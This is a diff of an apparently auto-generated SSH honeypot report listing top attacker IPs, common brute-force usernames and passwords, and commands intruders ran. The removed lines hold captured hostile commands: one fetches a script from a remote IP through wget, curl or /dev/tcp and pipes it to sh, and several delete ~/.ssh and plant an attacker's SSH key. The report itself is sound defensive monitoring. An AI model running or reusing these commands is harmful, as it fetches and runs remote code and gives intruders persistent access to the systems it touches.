@@ -13,63 +13,49 @@ system. The table is sorted by the number of attempts.
 
 | Client IP | Count    |
 |-----------|----------|
-| 47.96.103.208 | 5663 |
-| 149.129.249.160 | 4541 |
-| 47.104.171.98 | 4264 |
-| 47.242.151.31 | 3632 |
-| 47.253.158.216 | 2849 |
-| 39.106.143.108 | 1667 |
-| 8.211.222.14 | 563 |
-| 47.251.104.144 | 369 |
-| 8.130.102.128 | 252 |
-| 1.92.121.249 | 159 |
+| 47.99.130.35 | 12821 |
+| 121.41.52.153 | 5060 |
+| 47.242.151.31 | 1083 |
+| 47.253.158.216 | 215 |
+| 8.130.102.128 | 208 |
+| 20.89.177.244 | 71 |
+| 60.247.32.126 | 67 |
+| 139.199.80.137 | 56 |
+| 111.161.66.144 | 51 |
+| 118.194.232.39 | 40 |
 
 ### Top 10 malicious try to login as
 
 | Usernames | Count    |
 |-----------|----------|
-| root | 1444 |
-| cvs | 504 |
-| kali | 504 |
-| tomcat | 503 |
-| cynthia | 501 |
-| toor | 501 |
-| ubuntu | 34 |
-| ubuntu2 | 9 |
-| terraria | 7 |
-| test | 7 |
+| root | 7387 |
+| ubuntu | 49 |
+| steam | 25 |
+| oracle | 20 |
+| postgres | 20 |
+| ftpuser | 19 |
+| mysql | 19 |
+| newuser | 19 |
+| debian | 18 |
+| frappe | 18 |
 
 ### Top 10 malicious try to authenticate with
 
 | Password | Count    |
 |-----------|----------|
-| 123456 | 52 |
-| 111111 | 23 |
 | root | 18 |
-| 123 | 16 |
-| P@ssw0rd | 14 |
-| password | 13 |
-| 1234 | 13 |
-| welcome@2020 | 10 |
-| rootoor | 10 |
-| root!123456 | 10 |
+| 1234567 | 15 |
+| welcome | 14 |
+| 12345678 | 13 |
+| 123123 | 13 |
+| password@123 | 10 |
+| abc123@# | 10 |
+| 321 | 10 |
+| 123456 | 10 |
+| webadmin123 | 9 |
 
 ### Top malicious commands try to execute
 
 | Client | Command |
 |--------|---------|
-| 5.182.211.148 | uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://154.216.19.57/sh \|\| curl http://154.216.19.57/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/154.216.19.57/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 154.216.19.57\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 \| sh -s ssh; exec 3>&-; else echo "$SC" \| sh -s ssh; fi |
-| 1.92.121.249 | uname -s -m |
-| 119.96.31.97 | uname -s -m |
-| 192.241.141.141 | cd ~; chattr -ia .ssh; lockr -ia .ssh |
-| 192.241.141.141 | cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~ |
-| 192.241.141.141 | cat /proc/cpuinfo \| grep name \| wc -l |
-| 77.232.142.189 | cd ~; chattr -ia .ssh; lockr -ia .ssh |
-| 77.232.142.189 | cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~ |
-| 77.232.142.189 | cat /proc/cpuinfo \| grep name \| wc -l |
-| 203.171.21.222 | cd ~; chattr -ia .ssh; lockr -ia .ssh |
-| 203.171.21.222 | cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~ |
-| 203.171.21.222 | cat /proc/cpuinfo \| grep name \| wc -l |
-| 109.167.197.20 | cd ~; chattr -ia .ssh; lockr -ia .ssh |
-| 109.167.197.20 | cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~ |
-| 109.167.197.20 | cat /proc/cpuinfo \| grep name \| wc -l |
+| 47.99.130.35 | echo -e "\x6F\x6B" |
